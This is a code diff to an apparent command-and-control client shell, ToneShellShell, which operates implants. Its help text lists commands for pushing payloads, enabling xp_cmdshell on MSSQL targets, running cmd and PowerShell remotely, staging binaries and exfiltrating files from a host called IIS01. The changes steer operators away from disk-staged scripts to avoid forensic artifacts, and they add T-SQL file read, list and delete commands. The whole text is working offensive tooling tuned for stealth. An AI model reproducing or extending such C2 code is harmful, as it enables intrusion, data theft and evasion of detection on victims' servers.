@@ -16,8 +16,8 @@ Built-in commands (case-insensitive):
     put <payload_name> <dest_path>  push file FROM server payloads dir TO implant
     kill                            send TERMINATE (id=255) to current implant
     xpinit <host:port> <login> <pass>       enable xp_cmdshell + sp_OA on MSSQL target
-    xpshell cmd <cmd>               run cmd.exe command on MSSQL host via xp_cmdshell
-    xpshell psh <ps_script>         stage and run PowerShell script on MSSQL host
+    xpshell cmd <cmd>               [DEPRECATED] run cmd via .bat staging on IIS01; use xpexec instead
+    xpshell psh <ps_script>         [DEPRECATED] stage .ps1 and run PowerShell on IIS01; use xpexec powershell -Command instead
     xpstage-aes <payload> [--no-encrypt]   [DEPRECATED] stage binary via AES-256-CBC base64 + PowerShell on IIS01; use xpstage-hex instead
     xpstage-hex <payload>                  stage binary via hex SQL + T-SQL ADODB.Stream (no .ps1)
     xpexfil-aes <remote_path> <local_name> [insert_timeout_s] [chunk_mb]  [DEPRECATED] exfil via AES-256-CBC + PowerShell on IIS01; use xpexfil-hex instead
@@ -27,6 +27,7 @@ Built-in commands (case-insensitive):
     xpexec <cmd>                    run command via xpagent SB queue, wait for result
     xpexec-bg <cmd>                 fire-and-forget xpexec (returns cmd_id)
     xpout <cmd_id>                  read xpagent output rows by cmd_id
+    xpfile exists|del|cat|ls <path> file ops on IIS01 via T-SQL (no cmd spawn)
     help                            show this help
     exit / quit                     exit the shell
 
@@ -157,9 +158,21 @@ class ToneShellShell(C2Client):
                     elif not self._xp.ready():
                         print("[!] run xpinit first")
                     elif parts[1] == "cmd":
-                        self._xp.cmd_xpshell_cmd(self, parts[2])
+                        print("[DEPRECATED] xpshell cmd stages a .bat file to IIS01 disk via sp_OA FileSystemObject.")
+                        print("             Prefer xpexec (no .bat staging, no disk artifact on IIS01).")
+                        ans = input("  Continue anyway? [y/N] ").strip().lower()
+                        if ans not in ("y", "yes"):
+                            print("[*] aborted")
+                        else:
+                            self._xp.cmd_xpshell_cmd(self, parts[2])
                     elif parts[1] == "psh":
-                        self._xp.cmd_xpshell_psh(self, parts[2])
+                        print("[DEPRECATED] xpshell psh stages a .ps1 file to IIS01 disk via sp_OA FileSystemObject.")
+                        print("             Prefer xpexec powershell -Command \"...\" for short scripts (no .ps1 staging).")
+                        ans = input("  Continue anyway? [y/N] ").strip().lower()
+                        if ans not in ("y", "yes"):
+                            print("[*] aborted")
+                        else:
+                            self._xp.cmd_xpshell_psh(self, parts[2])
                     else:
                         print("usage: xpshell cmd|psh <command_or_script>")
 
@@ -270,6 +283,27 @@ class ToneShellShell(C2Client):
                             self._xp.cmd_xpout(self, int(parts[1]))
                         except ValueError:
                             print("usage: xpout <cmd_id>  (cmd_id must be an integer)")
+
+                elif cmd == "xpfile":
+                    if not self.session:
+                        print("[!] not attached to a session")
+                    elif len(parts) < 3:
+                        print("usage: xpfile exists|del|cat|ls <path>")
+                    elif not self._xp.ready():
+                        print("[!] run xpinit first")
+                    else:
+                        sub  = parts[1].lower()
+                        path = parts[2].strip('"')
+                        if sub == "exists":
+                            self._xp.cmd_xpfile_exists(self, path)
+                        elif sub == "del":
+                            self._xp.cmd_xpfile_del(self, path)
+                        elif sub == "cat":
+                            self._xp.cmd_xpfile_cat(self, path)
+                        elif sub == "ls":
+                            self._xp.cmd_xpfile_ls(self, path)
+                        else:
+                            print("usage: xpfile exists|del|cat|ls <path>")
 
                 else:
                     if not self.session:
